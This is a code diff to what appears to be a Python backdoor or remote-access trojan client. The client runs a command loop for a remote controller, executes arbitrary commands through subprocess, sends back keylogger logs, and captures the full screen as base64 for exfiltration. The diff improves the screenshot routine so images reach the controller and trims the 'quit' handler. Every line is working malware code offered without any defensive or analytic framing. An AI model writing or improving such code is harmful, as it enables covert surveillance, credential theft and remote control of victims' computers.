@@ -126,13 +126,10 @@ def retrieve_keylogger_log():
 def take_screenshot():
     with mss.mss() as sct:
         # Capture the screen
-        screenshot = sct.shot(output='screenshot.png')
-        with open(screenshot, 'rb') as f:
-            screenshot_data = f.read()
-        # Encode the screenshot data in base64 for transmission
-        encoded_screenshot = base64.b64encode(screenshot_data).decode()
-        reliable_send(encoded_screenshot)  # Send the encoded screenshot data
-
+        screenshot = sct.grab(sct.monitors[0])  # Capture full screen
+        image_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)  # Convert to PNG format
+        encoded_img = base64.b64encode(image_bytes).decode('utf-8')  # Encode the image in base64
+        return encoded_img 
 
 # Main shell function for command execution
 def shell():
@@ -141,8 +138,6 @@ def shell():
         command = reliable_recv()
         if command == 'quit':
             # If the command is 'quit', exit the shell loop
-            print(log)
-            reliable_send(log)
             break
         elif command == 'clear':
             # If the command is 'clear', do nothing (used for clearing the screen)
@@ -169,9 +164,9 @@ def shell():
             log_data = retrieve_keylogger_log()
             reliable_send(log_data)
         elif command == 'screenshot':
-            # If the command is 'screenshot', take a screenshot
-            take_screenshot()
-            reliable_send("[+] Screenshot taken and sent.")
+            # If the command is 'screenshot', take a screenshot and send it
+            screenshot_data = take_screenshot()
+            reliable_send(screenshot_data)
         else:
             try:
                 # For other commands, execute them using subprocess
